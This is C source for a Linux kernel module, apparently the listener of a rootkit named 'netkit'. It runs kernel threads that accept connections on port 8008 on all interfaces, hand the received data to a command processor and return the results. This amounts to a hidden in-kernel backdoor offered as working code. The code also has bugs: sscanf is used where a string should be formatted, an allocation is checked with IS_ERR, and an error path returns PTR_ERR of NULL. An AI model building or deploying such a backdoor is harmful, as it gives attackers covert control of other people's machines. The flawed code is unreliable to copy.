#include <linux/types.h>
#include <linux/kthread.h>
#include <linux/freezer.h>
#include <linux/sched.h>
#include <linux/errno.h>
#include <linux/random.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/net.h>
#include <linux/delay.h>

#include "server.h"

#include "../../core/cmd/cmd.h"
#include "../../core/packet/packet.h"
#include "../../sys/mem.h"
#include "../../sys/socket.h"
#include "../../sys/debug.h"

#define SERVER_IP "0.0.0.0"
#define SERVER_PORT 8008

#define KTHREAD_LOOP_NAME "netkit-loop"

// wait for all conns to finish
static struct kref active_conns;
static struct task_struct *task_loop = NULL;

static int server_conn_handler(void *args)
{
    server_packet_t *packet = (server_packet_t*)args;
    u8* res_buf = NULL;
    size_t res_buflen = 0;
    int retv;

    kref_get(&active_conns);

    NETKIT_LOG("[*] calling io_process (req_buflen: %lu)...\n", packet->req_buflen);
    retv = io_process(packet->req_buf, packet->req_buflen, &res_buf, &res_buflen);
    NETKIT_LOG("[*] sending response to client (res_buflen: %lu)...\n", res_buflen);
    retv = socket_write(packet->client_sk, res_buf, res_buflen);
    
    sock_release(packet->client_sk);
    kzfree(packet->req_buf, packet->req_buflen);
    kzfree(packet, sizeof(*packet));
    kzfree(res_buf, res_buflen);
    
    // kref_sub without release()
    atomic_sub(1, (atomic_t *)&active_conns.refcount);
    
    return retv;
}

/**
 * Listens to connections, parses the packet and starts packet processing
 */
static int server_conn_loop(void* args)
{
    char kthread_name[29];  // strlen("netkit-conn-handler-") + 8 + 1
    unsigned int kthread_name_id;
    struct task_struct *conn_task;
    struct socket *server_sk;
    struct sockaddr_in *server_addr;
    struct socket *client_sk;
    server_packet_t *packet;
    int conn_retv;
    int retv = 0;

    kref_get(&active_conns);
    retv = socket_create(inet_addr(SERVER_IP), htons(SERVER_PORT), &server_sk, &server_addr);
    if (retv < 0)
    {
        NETKIT_LOG("[!] failed to get socket (err: %d)\n", retv);
        goto LAB_OUT_NO_SOCK;
    }

    retv = socket_listen(server_sk, server_addr);
    if (retv < 0)
    {
        NETKIT_LOG("[!] failed to listen (err: %d)\n", retv);
        goto LAB_OUT;
    }

    NETKIT_LOG("[+] started listening for connections\n");
    
    while (likely(!kthread_should_stop()))
    {
        // conn polling needs to be optimized for speed, to make overhead minimal
        NETKIT_LOG("[*] checking for connection...\n");
		if (unlikely(try_to_freeze()))
			continue;

        conn_retv = kernel_accept(server_sk, &client_sk, SOCK_NONBLOCK);
        if (likely(conn_retv == -EAGAIN))
        {
            schedule_timeout_interruptible(HZ / 10);  // 100ms check rate
            continue;
        }
        
        if (conn_retv < 0) {
            continue;
        }

        NETKIT_LOG("[+] received connection\n");

        packet = kzmalloc(sizeof(*packet), GFP_KERNEL);
        if (IS_ERR(packet))
            goto LAB_CONN_OUT_NO_PACKET;

        packet->client_sk = client_sk;
        retv = socket_read(packet->client_sk, &packet->req_buf, &packet->req_buflen);
        if (retv < 0)
        {
            NETKIT_LOG("[!] failed to read bytes from connection\n");
            goto LAB_CONN_OUT;
        }

        kthread_name_id = (int)get_random_long();
        sscanf(kthread_name, "netkit-conn-handler-%08x", &kthread_name_id);

        NETKIT_LOG("[+] starting server conn handler\n");

        // child should free packet
        conn_task = kthread_run(server_conn_handler, packet, kthread_name);
        if (IS_ERR(conn_task))
        {
            NETKIT_LOG("[!] failed to start handler\n");
            goto LAB_CONN_OUT;
        }

        continue;

LAB_CONN_OUT:
        if (packet->req_buf)
            kzfree(packet->req_buf, packet->req_buflen);

        kzfree(packet, sizeof(*packet));
        packet = NULL;
LAB_CONN_OUT_NO_PACKET:
        sock_release(client_sk);
        client_sk = NULL;
    }

LAB_OUT:
    NETKIT_LOG("[*] received kthread_stop. quitting...\n");
    sock_release(server_sk);

LAB_OUT_NO_SOCK:
    atomic_sub(1, (atomic_t *)&active_conns.refcount);

    return retv;
}

/**
 * Initializes the kthread for the server
 * Return: 0 if successful
 */
int server_init(void)
{
    int retv = 0;

    NETKIT_LOG("[*] starting server_conn_loop...\n");

    task_loop = kthread_run(server_conn_loop, NULL, KTHREAD_LOOP_NAME);
    if (IS_ERR(task_loop))
    {
        task_loop = NULL;
        return PTR_ERR(task_loop);
    }

    kref_init(&active_conns);

    return retv;
}

int server_exit(void)
{
    int retv;
    DECLARE_WAIT_QUEUE_HEAD(wait_queue);

    if (!task_loop)
    {
        NETKIT_LOG("[!] task loop does not exist when exiting\n");
        return -ECHILD;
    }

    // stop while loop
    retv = kthread_stop(task_loop);
    if (retv < 0)
        NETKIT_LOG("[!] kthread returned error\n");

    // block until all kthreads (including conn loop) are handled
    // use 1 since kref_init sets the counter to 1
    wait_event(wait_queue, kref_read(&active_conns) == 1);

    return retv;
}